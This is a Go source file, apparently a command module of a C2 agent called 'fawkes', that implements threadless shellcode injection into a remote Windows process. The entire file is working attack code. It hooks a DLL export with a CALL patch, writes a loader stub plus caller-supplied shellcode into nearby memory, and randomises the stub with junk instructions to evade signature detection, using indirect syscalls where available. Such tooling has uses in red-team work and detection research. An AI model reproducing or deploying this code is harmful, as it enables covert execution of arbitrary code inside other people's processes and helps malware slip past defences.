//go:build windows
// +build windows

// Threadless injection implementation adapted from:
// https://github.com/dreamkinn/go-ThreadlessInject
// Original technique by CCob: https://github.com/CCob/ThreadlessInject

package commands

import (
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"math/rand"
	"strings"
	"unsafe"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
)

var (
	callOpCode = []byte{0xe8, 0, 0, 0, 0}
	uintsize   = unsafe.Sizeof(uintptr(0))

	// Package-level variables for payload (matching reference)
	threadlessPayload     []byte
	threadlessPayloadSize int
)

// buildLoaderStub dynamically generates a functionally equivalent loader stub
// with randomized instruction encodings and junk instruction insertion to avoid
// static byte signatures. Returns the stub bytes and the offset where the
// original function bytes placeholder begins (for patching by generateHook).
func buildLoaderStub() ([]byte, int) {
	var b []byte

	// insertJunk appends 0-2 semantically neutral instructions to break up
	// byte patterns. Uses a mix of multi-byte NOPs and self-referential
	// register operations on callee-saved registers (value-preserving).
	insertJunk := func() {
		n := rand.Intn(3)
		for i := 0; i < n; i++ {
			switch rand.Intn(8) {
			case 0:
				b = append(b, 0x90) // nop
			case 1:
				b = append(b, 0x0F, 0x1F, 0x00) // 3-byte nop
			case 2:
				b = append(b, 0x0F, 0x1F, 0x40, 0x00) // 4-byte nop
			case 3:
				b = append(b, 0x48, 0x87, 0xDB) // xchg rbx, rbx
			case 4:
				b = append(b, 0x48, 0x8D, 0x1B) // lea rbx, [rbx]
			case 5:
				b = append(b, 0x48, 0x8B, 0xFF) // mov rdi, rdi
			case 6:
				b = append(b, 0x48, 0x87, 0xFF) // xchg rdi, rdi
			case 7:
				b = append(b, 0x66, 0x0F, 0x1F, 0x44, 0x00, 0x00) // 6-byte nop
			}
		}
	}

	// 1. Pop return address (placed by the CALL hook) into rax
	switch rand.Intn(3) {
	case 0:
		b = append(b, 0x58) // pop rax
	case 1:
		// mov rax, [rsp]; lea rsp, [rsp+8]
		b = append(b, 0x48, 0x8B, 0x04, 0x24)
		b = append(b, 0x48, 0x8D, 0x64, 0x24, 0x08)
	case 2:
		// mov rax, [rsp]; add rsp, 8
		b = append(b, 0x48, 0x8B, 0x04, 0x24)
		b = append(b, 0x48, 0x83, 0xC4, 0x08)
	}

	insertJunk()

	// 2. Calculate original function entry (rax -= 5, accounting for CALL opcode size)
	switch rand.Intn(3) {
	case 0:
		b = append(b, 0x48, 0x83, 0xE8, 0x05) // sub rax, 5
	case 1:
		b = append(b, 0x48, 0x83, 0xC0, 0xFB) // add rax, -5
	case 2:
		b = append(b, 0x48, 0x8D, 0x40, 0xFB) // lea rax, [rax-5]
	}

	insertJunk()

	// 3. Preserve original function address on the stack
	b = append(b, 0x50) // push rax

	// 4. Save volatile registers in randomized order
	type regPair struct {
		push, pop []byte
	}
	regs := []regPair{
		{[]byte{0x51}, []byte{0x59}},             // rcx
		{[]byte{0x52}, []byte{0x5A}},             // rdx
		{[]byte{0x41, 0x50}, []byte{0x41, 0x58}}, // r8
		{[]byte{0x41, 0x51}, []byte{0x41, 0x59}}, // r9
		{[]byte{0x41, 0x52}, []byte{0x41, 0x5A}}, // r10
		{[]byte{0x41, 0x53}, []byte{0x41, 0x5B}}, // r11
	}
	rand.Shuffle(len(regs), func(i, j int) {
		regs[i], regs[j] = regs[j], regs[i]
	})
	for _, r := range regs {
		b = append(b, r.push...)
	}

	insertJunk()

	// 5. Load original function prologue bytes into a register (randomized choice)
	// The 8-byte immediate is a placeholder that generateHook overwrites with the
	// actual bytes read from the hooked function.
	type movEncoding struct {
		imm64Prefix []byte // REX + opcode for "mov reg, imm64"
		storeBytes  []byte // encoding for "mov [rax], reg"
	}
	movOptions := []movEncoding{
		{[]byte{0x48, 0xB9}, []byte{0x48, 0x89, 0x08}}, // rcx
		{[]byte{0x48, 0xBA}, []byte{0x48, 0x89, 0x10}}, // rdx
		{[]byte{0x49, 0xB8}, []byte{0x4C, 0x89, 0x00}}, // r8
		{[]byte{0x49, 0xB9}, []byte{0x4C, 0x89, 0x08}}, // r9
	}
	chosen := movOptions[rand.Intn(len(movOptions))]

	b = append(b, chosen.imm64Prefix...)
	originalBytesOffset := len(b)
	b = append(b, 0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11) // placeholder

	// 6. Write original bytes back to the hooked function entry point
	b = append(b, chosen.storeBytes...)

	insertJunk()

	// 7. Allocate shadow space for the shellcode call
	switch rand.Intn(2) {
	case 0:
		b = append(b, 0x48, 0x83, 0xEC, 0x40) // sub rsp, 0x40
	case 1:
		b = append(b, 0x48, 0x8D, 0x64, 0x24, 0xC0) // lea rsp, [rsp-0x40]
	}

	// 8. Call the shellcode (appended immediately after this stub)
	callPos := len(b)
	b = append(b, 0xE8, 0x00, 0x00, 0x00, 0x00) // call rel32 (fixed up below)

	// 9. Deallocate shadow space
	switch rand.Intn(2) {
	case 0:
		b = append(b, 0x48, 0x83, 0xC4, 0x40) // add rsp, 0x40
	case 1:
		b = append(b, 0x48, 0x8D, 0x64, 0x24, 0x40) // lea rsp, [rsp+0x40]
	}

	insertJunk()

	// 10. Restore volatile registers in reverse order
	for i := len(regs) - 1; i >= 0; i-- {
		b = append(b, regs[i].pop...)
	}

	// 11. Restore rax (original function address)
	b = append(b, 0x58) // pop rax

	insertJunk()

	// 12. Jump to the now-restored original function
	switch rand.Intn(2) {
	case 0:
		b = append(b, 0xFF, 0xE0) // jmp rax
	case 1:
		b = append(b, 0x50, 0xC3) // push rax; ret
	}

	// Fix up the CALL rel32 offset: target is the first byte after the stub
	relOffset := int32(len(b) - (callPos + 5))
	b[callPos+1] = byte(relOffset)
	b[callPos+2] = byte(relOffset >> 8)
	b[callPos+3] = byte(relOffset >> 16)
	b[callPos+4] = byte(relOffset >> 24)

	return b, originalBytesOffset
}

type ThreadlessInjectCommand struct{}

func (c *ThreadlessInjectCommand) Name() string {
	return "threadless-inject"
}

func (c *ThreadlessInjectCommand) Description() string {
	return "Inject shellcode using threadless injection by hooking a DLL function in a remote process"
}

func (c *ThreadlessInjectCommand) Execute(task structs.Task) structs.CommandResult {
	// Parse parameters
	var params struct {
		ShellcodeB64 string `json:"shellcode_b64"`
		PID          int    `json:"pid"`
		DLLName      string `json:"dll_name"`
		FunctionName string `json:"function_name"`
	}

	if err := json.Unmarshal([]byte(task.Params), &params); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to parse parameters: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Validate parameters
	if params.ShellcodeB64 == "" {
		return structs.CommandResult{
			Output:    "Shellcode is required",
			Status:    "error",
			Completed: true,
		}
	}

	if params.PID == 0 {
		return structs.CommandResult{
			Output:    "PID is required",
			Status:    "error",
			Completed: true,
		}
	}

	// Decode shellcode
	shellcode, err := base64.StdEncoding.DecodeString(params.ShellcodeB64)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to decode shellcode: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	if len(shellcode) == 0 {
		return structs.CommandResult{
			Output:    "Shellcode is empty",
			Status:    "error",
			Completed: true,
		}
	}

	// Perform threadless injection
	output, err := threadlessInject(uint32(params.PID), shellcode, params.DLLName, params.FunctionName)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Threadless injection failed: %v\n%s", err, output),
			Status:    "error",
			Completed: true,
		}
	}

	return structs.CommandResult{
		Output:    output,
		Status:    "completed",
		Completed: true,
	}
}

func (c *ThreadlessInjectCommand) ExecuteWithAgent(task structs.Task, agent *structs.Agent) structs.CommandResult {
	return c.Execute(task)
}

func generateHook(originalBytes []byte, patchOffset int) {
	// Overwrite placeholder bytes in loader with actual original function prologue
	for i := 0; i < len(originalBytes); i++ {
		threadlessPayload[patchOffset+i] = originalBytes[i]
	}
}

func findMemoryHole(pHandle, exportAddress, size uintptr) (uintptr, error) {
	// findMemoryHole needs to probe many addresses; use VirtualAllocEx directly
	// since NtAllocateVirtualMemory with a preferred base address works differently
	// (it rounds down). The indirect syscall benefit here is minimal since we're
	// just allocating, not injecting.
	for addr := (exportAddress & 0xFFFFFFFFFFF70000) - 0x70000000; addr < exportAddress+0x70000000; addr += 0x10000 {
		if IndirectSyscallsAvailable() {
			baseAddr := addr
			regionSize := size
			status := IndirectNtAllocateVirtualMemory(pHandle, &baseAddr, &regionSize,
				MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
			if status == 0 {
				return baseAddr, nil
			}
		} else {
			ret, _, _ := procVirtualAllocEx.Call(pHandle, addr, size,
				uintptr(MEM_COMMIT|MEM_RESERVE), uintptr(PAGE_READWRITE))
			if ret != 0 {
				return ret, nil
			}
		}
	}
	return 0, fmt.Errorf("could not find memory hole within ±1.75GB of export address")
}

func threadlessInject(pid uint32, shellcode []byte, dllName, functionName string) (string, error) {
	var sb strings.Builder

	sb.WriteString("[*] Threadless Injection starting\n")
	sb.WriteString(fmt.Sprintf("[*] Shellcode size: %d bytes\n", len(shellcode)))
	sb.WriteString(fmt.Sprintf("[*] Target PID: %d\n", pid))
	sb.WriteString(fmt.Sprintf("[*] Target: %s!%s\n", dllName, functionName))

	if IndirectSyscallsAvailable() {
		sb.WriteString("[*] Using indirect syscalls (Nt* via stubs)\n")
	}

	// Step 1: Open process
	desiredAccess := uint32(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
		PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ)
	hProcess, err := injectOpenProcess(desiredAccess, pid)
	if err != nil {
		return sb.String(), err
	}
	defer injectCloseHandle(hProcess)
	sb.WriteString(fmt.Sprintf("[+] Opened process handle: 0x%X\n", hProcess))

	// Step 2: Get address of remote function to hook
	DLL := windows.NewLazySystemDLL(dllName)
	remote_fct := DLL.NewProc(functionName)
	exportAddress := remote_fct.Addr()
	sb.WriteString(fmt.Sprintf("[+] Export address: 0x%X\n", exportAddress))

	// Step 3: Build a randomized loader stub
	loaderStub, patchOffset := buildLoaderStub()
	threadlessPayload = append(loaderStub, shellcode...)
	threadlessPayloadSize = len(threadlessPayload)

	// Step 4: Find memory hole within ±1.75GB of export
	loaderAddress, err := findMemoryHole(hProcess, exportAddress, uintptr(threadlessPayloadSize))
	if err != nil {
		return sb.String(), err
	}
	sb.WriteString(fmt.Sprintf("[+] Found memory hole at: 0x%X\n", loaderAddress))

	// Step 5: Read original bytes of the remote function
	originalBytes, err := injectReadMemory(hProcess, exportAddress, 8)
	if err != nil {
		return sb.String(), fmt.Errorf("error reading function prologue: %v", err)
	}

	// Step 6: Patch loader with original function bytes
	generateHook(originalBytes, patchOffset)

	// Step 7: Temporarily make function memory writable for hook installation
	oldProt, err := injectProtectMemory(hProcess, exportAddress, 8, PAGE_EXECUTE_READWRITE)
	if err != nil {
		return sb.String(), fmt.Errorf("error unprotecting function: %v", err)
	}

	// Step 8: Build and install the CALL hook
	relativeLoaderAddress := uint32(uint64(loaderAddress) - (uint64(exportAddress) + 5))
	relativeLoaderAddressArray := make([]byte, uintsize)
	binary.LittleEndian.PutUint32(relativeLoaderAddressArray, relativeLoaderAddress)

	hookBytes := make([]byte, 5)
	copy(hookBytes, callOpCode)
	hookBytes[1] = relativeLoaderAddressArray[0]
	hookBytes[2] = relativeLoaderAddressArray[1]
	hookBytes[3] = relativeLoaderAddressArray[2]
	hookBytes[4] = relativeLoaderAddressArray[3]

	_, err = injectWriteMemory(hProcess, exportAddress, hookBytes)
	if err != nil {
		return sb.String(), fmt.Errorf("failed to install hook: %v", err)
	}
	sb.WriteString("[+] Hook installed at export address\n")

	// Restore original protection on hooked function
	injectProtectMemory(hProcess, exportAddress, 8, oldProt)

	// Step 9: Write loader + shellcode to memory hole (W^X: RW → write → RX)
	_, err = injectWriteMemory(hProcess, loaderAddress, threadlessPayload)
	if err != nil {
		return sb.String(), fmt.Errorf("error writing loader: %v", err)
	}
	sb.WriteString(fmt.Sprintf("[+] Wrote %d bytes (loader + shellcode)\n", threadlessPayloadSize))

	// Step 10: Change loader memory to RX
	_, err = injectProtectMemory(hProcess, loaderAddress, threadlessPayloadSize, PAGE_EXECUTE_READ)
	if err != nil {
		return sb.String(), fmt.Errorf("error protecting loader as RX: %v", err)
	}
	sb.WriteString("[+] Loader memory protected as RX\n")

	sb.WriteString(fmt.Sprintf("[+] Shellcode injected into PID %d\n", pid))
	sb.WriteString(fmt.Sprintf("[+] Target: %s!%s (0x%X)\n", dllName, functionName, exportAddress))
	sb.WriteString(fmt.Sprintf("[+] Loader at: 0x%X\n", loaderAddress))
	sb.WriteString("[+] Hook installed. Shellcode will execute when function is called.\n")
	if IndirectSyscallsAvailable() {
		sb.WriteString("[+] Threadless injection completed successfully (indirect syscalls)\n")
	} else {
		sb.WriteString("[+] Threadless injection completed successfully\n")
	}

	return sb.String(), nil
}
